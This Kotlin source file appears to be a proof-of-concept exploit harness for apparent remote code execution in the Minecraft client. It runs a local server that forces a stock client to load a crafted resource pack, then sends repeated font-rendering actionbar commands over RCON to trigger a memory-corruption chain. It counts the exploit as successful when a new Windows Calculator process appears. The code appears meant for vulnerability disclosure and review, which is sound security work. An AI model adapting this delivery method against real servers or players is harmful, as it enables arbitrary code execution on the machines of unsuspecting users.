package poc

import com.google.gson.GsonBuilder
import com.sun.jna.Native
import com.sun.jna.Pointer
import com.sun.jna.platform.win32.*
import com.sun.jna.ptr.IntByReference
import com.sun.net.httpserver.HttpServer
import java.io.DataInputStream
import java.io.InputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.nio.file.StandardCopyOption
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.system.exitProcess

object Main {
    val ROOT: Path = Paths.get("").toAbsolutePath().normalize()
    const val PACK_SHA1 = "F2E2859318152E32FC331D2291C2EC40FFB3C372"
    const val PLAYER = "ProofClient"
    const val SERVER_PORT = 25565
    const val HTTP_PORT = 8766
    const val RCON_PORT = 25575
    const val QUIET_SECONDS = 15L

    private val gson = GsonBuilder().setPrettyPrinting().create()

    private fun resolvePackFile(): Path {
        val local = ROOT.resolve("resource-pack.zip")
        if (Files.isRegularFile(local)) return local
        val resourceStream = Main::class.java.getResourceAsStream("/resource-pack.zip")
            ?: throw RuntimeException("resource-pack.zip not found in working directory or classpath resources")
        val extracted = ROOT.resolve("build/tmp/resource-pack.zip")
        extracted.parent?.let { Files.createDirectories(it) }
        resourceStream.use { input ->
            Files.copy(input, extracted, StandardCopyOption.REPLACE_EXISTING)
        }
        return extracted
    }

    fun calculatorProcesses(): Set<Int> {
        val snapshot =
            Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, WinDef.DWORD(0))
        if (snapshot == WinNT.INVALID_HANDLE_VALUE) {
            throw RuntimeException("Could not enumerate Windows processes: ${Native.getLastError()}")
        }
        val found = mutableSetOf<Int>()
        try {
            val entry = Tlhelp32.PROCESSENTRY32.ByReference()
            if (Kernel32.INSTANCE.Process32First(snapshot, entry)) {
                do {
                    val exeName = Native.toString(entry.szExeFile).lowercase()
                    if (exeName == "calc.exe" || exeName == "calculatorapp.exe") {
                        found.add(entry.th32ProcessID.toInt())
                    }
                } while (Kernel32.INSTANCE.Process32Next(snapshot, entry))
            }
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot)
        }
        return found
    }

    fun visibleCalculatorWindow(processIds: Set<Int>): List<Pair<Int, String>> {
        val windows = mutableListOf<Pair<Int, String>>()
        User32.INSTANCE.EnumWindows({ hwnd: WinDef.HWND, _: Pointer? ->
            if (!User32.INSTANCE.IsWindowVisible(hwnd)) {
                return@EnumWindows true
            }
            val pidRef = IntByReference()
            User32.INSTANCE.GetWindowThreadProcessId(hwnd, pidRef)
            val length = User32.INSTANCE.GetWindowTextLength(hwnd)
            val title = if (length > 0) {
                val buffer = CharArray(length + 1)
                User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.size)
                Native.toString(buffer)
            } else {
                ""
            }
            val pid = pidRef.value
            if (pid in processIds || title.lowercase().contains("calculator")) {
                windows.add(pid to title)
            }
            true
        }, null)
        return windows
    }

    fun monitorCalculator(baseline: Set<Int>, observed: MutableSet<Int>): Boolean {
        val current = calculatorProcesses()
        for (pid in (current - baseline - observed).sorted()) {
            observed.add(pid)
            println("CALCULATOR_PROCESS PID=$pid")
        }
        return observed.isNotEmpty()
    }

    fun waitForCalculator(baseline: Set<Int>, observed: MutableSet<Int>, seconds: Long): Boolean {
        val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(seconds)
        while (System.nanoTime() < deadline) {
            if (monitorCalculator(baseline, observed)) {
                return true
            }
            Thread.sleep(250)
        }
        return monitorCalculator(baseline, observed)
    }

    fun requireFreePorts() {
        for (port in listOf(SERVER_PORT, HTTP_PORT, RCON_PORT)) {
            try {
                Socket().use { probe ->
                    probe.connect(InetSocketAddress("127.0.0.1", port), 250)
                    throw RuntimeException("Local port $port is already in use")
                }
            } catch (e: RuntimeException) {
                throw e
            } catch (_: Exception) {
                // Port is free
            }
        }
    }

    fun makePackServer(packFile: Path, servedEvent: AtomicBoolean): HttpServer {
        val server = HttpServer.create(InetSocketAddress("127.0.0.1", HTTP_PORT), 0)
        server.createContext("/") { exchange ->
            if (exchange.requestMethod != "GET" || exchange.requestURI.path != "/resource-pack.zip") {
                exchange.sendResponseHeaders(404, -1)
                exchange.close()
                return@createContext
            }
            val size = Files.size(packFile)
            exchange.responseHeaders.add("Content-Type", "application/zip")
            exchange.sendResponseHeaders(200, size)
            exchange.responseBody.use { out ->
                Files.newInputStream(packFile).use { input ->
                    input.copyTo(out)
                }
            }
            servedEvent.set(true)
            println("PACK_SERVED resource-pack.zip")
        }
        server.executor = Executors.newCachedThreadPool { r ->
            Thread(r, "pack-http-server").apply { isDaemon = true }
        }
        server.start()
        return server
    }

    fun writeServerFiles(serverDir: Path, rconPassword: String) {
        Files.writeString(serverDir.resolve("eula.txt"), "eula=true", StandardCharsets.US_ASCII)
        val lines = listOf(
            "server-ip=127.0.0.1",
            "server-port=$SERVER_PORT",
            "online-mode=false",
            "enforce-secure-profile=false",
            "white-list=false",
            "enforce-whitelist=false",
            "enable-status=true",
            "max-players=4",
            "view-distance=2",
            "simulation-distance=2",
            "difficulty=peaceful",
            "spawn-monsters=false",
            "pause-when-empty-seconds=0",
            "sync-chunk-writes=false",
            "level-type=minecraft:flat",
            "level-name=world-proof",
            "accepts-transfers=true",
            "enable-rcon=true",
            "rcon.port=$RCON_PORT",
            "rcon.password=$rconPassword",
            "broadcast-rcon-to-ops=false",
            "resource-pack=http://127.0.0.1:$HTTP_PORT/resource-pack.zip",
            "resource-pack-sha1=$PACK_SHA1",
            "resource-pack-id=${UUID.randomUUID()}",
            "require-resource-pack=true"
        )
        Files.writeString(
            serverDir.resolve("server.properties"),
            lines.joinToString("") + "",
            StandardCharsets.US_ASCII
        )
    }

    fun textContains(path: Path, needle: String): Boolean {
        return try {
            Files.exists(path) && Files.readString(path, StandardCharsets.UTF_8).contains(needle)
        } catch (_: Exception) {
            false
        }
    }

    fun waitFor(
        label: String,
        timeoutSeconds: Long,
        processes: List<Process>,
        predicate: () -> Boolean
    ) {
        val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(timeoutSeconds)
        while (System.nanoTime() < deadline) {
            if (predicate()) return
            for (process in processes) {
                if (!process.isAlive) {
                    throw RuntimeException("$label: a Minecraft process exited early with code ${process.exitValue()}")
                }
            }
            Thread.sleep(250)
        }
        throw RuntimeException("Timed out waiting for $label")
    }

    fun rconPacket(requestId: Int, packetType: Int, text: String): ByteArray {
        val textBytes = text.toByteArray(StandardCharsets.UTF_8)
        val payloadSize = 4 + 4 + textBytes.size + 2
        val buffer = ByteBuffer.allocate(4 + payloadSize).order(ByteOrder.LITTLE_ENDIAN)
        buffer.putInt(payloadSize)
        buffer.putInt(requestId)
        buffer.putInt(packetType)
        buffer.put(textBytes)
        buffer.put(0)
        buffer.put(0)
        return buffer.array()
    }

    fun recvExact(input: InputStream, count: Int): ByteArray {
        val data = ByteArray(count)
        DataInputStream(input).readFully(data)
        return data
    }

    data class RconResponse(val requestId: Int, val packetType: Int, val body: String)

    fun rconReceive(input: InputStream): RconResponse {
        val lenBytes = recvExact(input, 4)
        val length = ByteBuffer.wrap(lenBytes).order(ByteOrder.LITTLE_ENDIAN).int
        if (length !in 10..4096) {
            throw IllegalStateException("Unexpected RCON packet length $length")
        }
        val payload = recvExact(input, length)
        val buf = ByteBuffer.wrap(payload).order(ByteOrder.LITTLE_ENDIAN)
        val requestId = buf.int
        val packetType = buf.int
        val textLen = length - 10
        val text = if (textLen > 0) String(payload, 8, textLen, StandardCharsets.UTF_8) else ""
        return RconResponse(requestId, packetType, text)
    }

    fun runPhase(
        phase: Char,
        password: String,
        baseline: Set<Int>,
        observed: MutableSet<Int>,
        logPath: Path
    ) {
        val codePoint = phase.code
        println("PHASE_$phase BEGIN 144 fonts glyph=U+%04X ($codePoint)".format(codePoint))
        val delayMs = if (phase == 'F') 650L else 1200L

        Socket().use { socket ->
            socket.soTimeout = 10_000
            socket.connect(InetSocketAddress("127.0.0.1", RCON_PORT), 10_000)
            val out = socket.getOutputStream()
            val input = socket.getInputStream()

            out.write(rconPacket(1, 3, password))
            out.flush()
            val auth = rconReceive(input)
            if (auth.requestId != 1) {
                throw RuntimeException("RCON authentication failed")
            }

            Files.newBufferedWriter(logPath, StandardCharsets.UTF_8).use { log ->
                for (face in 0 until 144) {
                    val fontName = "deferred-%03d".format(face)
                    val body = """{"text":"$phase","font":"ctf:$fontName"}"""
                    val requestId = face + 2
                    out.write(rconPacket(requestId, 2, "title $PLAYER actionbar $body"))
                    out.flush()

                    val resp = rconReceive(input)
                    if (resp.requestId != requestId || !resp.body.contains("Showing new actionbar")) {
                        throw RuntimeException("Phase $phase font $fontName: ${resp.body}")
                    }

                    val message = "%s %03d/144 font=%s accepted".format(phase, face + 1, fontName)
                    println(message)
                    log.write(message + "")
                    log.flush()

                    monitorCalculator(baseline, observed)
                    if (phase == 'A' && observed.isNotEmpty()) return

                    Thread.sleep(delayMs)

                    monitorCalculator(baseline, observed)
                    if (phase == 'A' && observed.isNotEmpty()) return
                }
            }
        }
        println("PHASE_$phase COMPLETE 144/144")
    }

    fun stopOwned(process: Process?) {
        if (process == null || !process.isAlive) return
        process.destroy()
        if (!process.waitFor(15, TimeUnit.SECONDS)) {
            process.destroyForcibly()
            process.waitFor(5, TimeUnit.SECONDS)
        }
    }

    fun runPoc(): Int {
        if (!System.getProperty("os.name").lowercase().contains("win")) {
            throw RuntimeException("This proof requires Windows x64")
        }
        val packFile = resolvePackFile()
        if (!Bootstrap.digest(packFile, "SHA-1").equals(PACK_SHA1, ignoreCase = true)) {
            throw RuntimeException("resource-pack.zip does not match the validated SHA1")
        }

        println("PACK_LAYOUT points=104 vector_bytes=832 (0x340) sweep=128 (0x80)")
        println("VM_LAYOUT stack_cells=12288 stack_bytes=49152 (0xC000) chain_offset=28672 (0x7000)")
        requireFreePorts()

        val manifest = Bootstrap.prepareDependencies(ROOT)
        val required = listOf(
            "client_jar", "server_runtime_jar", "server_launch_mode", "natives_dir",
            "assets_dir", "classpath_file", "logging_path_file", "options_file",
            "trusted_servers_dat", "java_path", "asset_index"
        )
        for (key in required) {
            if (manifest[key].isNullOrBlank()) {
                throw RuntimeException("Dependency bootstrap did not provide $key")
            }
        }
        if (manifest["server_launch_mode"] != "jar") {
            throw RuntimeException("This PoC requires an official server JAR")
        }

        val timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyyMMdd-HHmmss"))
        val runId = "$timestamp-${UUID.randomUUID().toString().replace("-", "").take(8)}"
        val runDir = ROOT.resolve("runs/$runId")
        val serverDir = runDir.resolve("server")
        val clientDir = runDir.resolve("client-game")

        Files.createDirectories(serverDir)
        Files.createDirectories(clientDir)

        Files.copy(
            Paths.get(manifest.getValue("options_file")),
            clientDir.resolve("options.txt"),
            StandardCopyOption.REPLACE_EXISTING
        )
        Files.copy(
            Paths.get(manifest.getValue("trusted_servers_dat")),
            clientDir.resolve("servers.dat"),
            StandardCopyOption.REPLACE_EXISTING
        )

        val rconPassword = UUID.randomUUID().toString().replace("-", "")
        writeServerFiles(serverDir, rconPassword)

        val baseline = calculatorProcesses()
        val observed = mutableSetOf<Int>()
        val servedEvent = AtomicBoolean(false)

        var serverHttp: HttpServer? = null
        var gameServer: Process? = null
        var gameClient: Process? = null

        val result = linkedMapOf(
            "success" to false,
            "calculator_pids" to emptyList<Int>(),
            "calculator_window_visible" to false,
            "pack_sha1" to PACK_SHA1,
            "run_dir" to runDir.toString()
        )

        try {
            serverHttp = makePackServer(packFile, servedEvent)
            val java = manifest.getValue("java_path")
            val serverArgs = listOf(
                java, "-Xms256M", "-Xmx1G", "-jar", manifest.getValue("server_runtime_jar"), "nogui"
            )
            gameServer = ProcessBuilder(serverArgs)
                .directory(serverDir.toFile())
                .redirectOutput(runDir.resolve("server.stdout.log").toFile())
                .redirectError(runDir.resolve("server.stderr.log").toFile())
                .start()

            waitFor("server startup", 180, listOf(gameServer)) {
                textContains(runDir.resolve("server.stdout.log"), "Done (")
            }

            val natives = manifest.getValue("natives_dir")
            val loggingPath = Files.readString(
                Paths.get(manifest.getValue("logging_path_file")),
                StandardCharsets.UTF_8
            ).trim()
            val classpath = Files.readString(
                Paths.get(manifest.getValue("classpath_file")),
                StandardCharsets.UTF_8
            ).trim()

            val clientArgs = listOf(
                java,
                "-Xms2G", "-Xmx4G",
                "-XX:+UseCompactObjectHeaders",
                "-XX:+AlwaysPreTouch",
                "-XX:+UseStringDeduplication",
                "-XX:+UseZGC",
                "-XX:StackShadowPages=32",
                "-XX:HeapDumpPath=${runDir.resolve("java_heapdump.hprof")}",
                "-XX:ErrorFile=${runDir.resolve("hs_err.log")}",
                "--enable-native-access=ALL-UNNAMED",
                "--add-exports", "java.base/jdk.internal.misc=ALL-UNNAMED",
                "-Djava.library.path=$natives",
                "-Djna.tmpdir=$natives",
                "-Dorg.lwjgl.system.SharedLibraryExtractPath=$natives",
                "-Dio.netty.native.workdir=$natives",
                "-Dminecraft.launcher.brand=local-proof",
                "-Dminecraft.launcher.version=1",
                "-Dlog4j.configurationFile=$loggingPath",
                "-cp", classpath,
                "net.minecraft.client.main.Main",
                "--username", PLAYER,
                "--version", "26.3",
                "--gameDir", clientDir.toString(),
                "--assetsDir", manifest.getValue("assets_dir"),
                "--assetIndex", manifest.getValue("asset_index"),
                "--uuid", "00000000000000000000000000000001",
                "--accessToken", "0",
                "--clientId", "0",
                "--xuid", "0",
                "--versionType", "release",
                "--width", "960",
                "--height", "540",
                "--quickPlayMultiplayer", "127.0.0.1:$SERVER_PORT"
            )

            gameClient = ProcessBuilder(clientArgs)
                .directory(clientDir.toFile())
                .redirectOutput(runDir.resolve("client.stdout.log").toFile())
                .redirectError(runDir.resolve("client.stderr.log").toFile())
                .start()

            println("STOCK_CLIENT_STARTED PID=${gameClient.pid()}")

            waitFor("client join and pack fetch", 240, listOf(gameServer, gameClient)) {
                servedEvent.get() && textContains(
                    runDir.resolve("server.stdout.log"),
                    "$PLAYER joined the game"
                )
            }

            waitFor("client resource-pack reload", 90, listOf(gameServer, gameClient)) {
                val latestLog = clientDir.resolve("logs/latest.log")
                Files.exists(latestLog) && Files.readAllLines(latestLog, StandardCharsets.UTF_8)
                    .any { line ->
                        line.contains("Reloading ResourceManager") && line.contains("server/")
                    }
            }

            println("STOCK_CLIENT_PACK_READY")
            println("QUIET_BEFORE_F=$QUIET_SECONDS seconds")
            Thread.sleep(QUIET_SECONDS * 1000L)

            runPhase('F', rconPassword, baseline, observed, runDir.resolve("phase-F.log"))

            println("QUIET_BEFORE_A=$QUIET_SECONDS seconds")
            Thread.sleep(QUIET_SECONDS * 1000L)

            try {
                runPhase('A', rconPassword, baseline, observed, runDir.resolve("phase-A.log"))
            } catch (error: Exception) {
                if (!waitForCalculator(baseline, observed, 5)) {
                    throw error
                }
                println("PHASE_A INTERRUPTED after Calculator launched")
            }

            if (!waitForCalculator(baseline, observed, 5)) {
                throw RuntimeException("No new Calculator process appeared")
            }

            val deadline = System.nanoTime() + TimeUnit.SECONDS.toNanos(10)
            var windows = emptyList<Pair<Int, String>>()
            while (System.nanoTime() < deadline) {
                windows = visibleCalculatorWindow(observed)
                if (windows.isNotEmpty()) break
                Thread.sleep(250)
            }

            result["success"] = true
            result["calculator_pids"] = observed.sorted()
            result["calculator_window_visible"] = windows.isNotEmpty()
            println("POC_SUCCESS Calculator PID(s): ${observed.sorted().joinToString(", ")}")
            println("CALCULATOR_WINDOW_VISIBLE=${windows.isNotEmpty()}")
        } catch (error: Exception) {
            if (waitForCalculator(baseline, observed, 5)) {
                val windows = visibleCalculatorWindow(observed)
                result["success"] = true
                result["calculator_pids"] = observed.sorted()
                result["calculator_window_visible"] = windows.isNotEmpty()
                println("POC_SUCCESS Calculator PID(s): ${observed.sorted().joinToString(", ")}")
                println("CALCULATOR_WINDOW_VISIBLE=${windows.isNotEmpty()}")
            } else {
                result["error"] = error.message ?: error.toString()
                println("POC_FAILURE ${error.message ?: error}")
            }
        } finally {
            stopOwned(gameClient)
            stopOwned(gameServer)
            serverHttp?.stop(0)

            val resultFile = runDir.resolve("result.json")
            Files.writeString(resultFile, gson.toJson(result) + "", StandardCharsets.UTF_8)

            println("RESULT_FILE=$resultFile")
            println("Calculator remains open for reviewer inspection when launched")
        }

        return if (result["success"] == true) 0 else 1
    }
}

fun main() {
    try {
        exitProcess(Main.runPoc())
    } catch (error: Exception) {
        System.err.println("POC_FAILURE ${error.message ?: error}")
        exitProcess(1)
    }
}
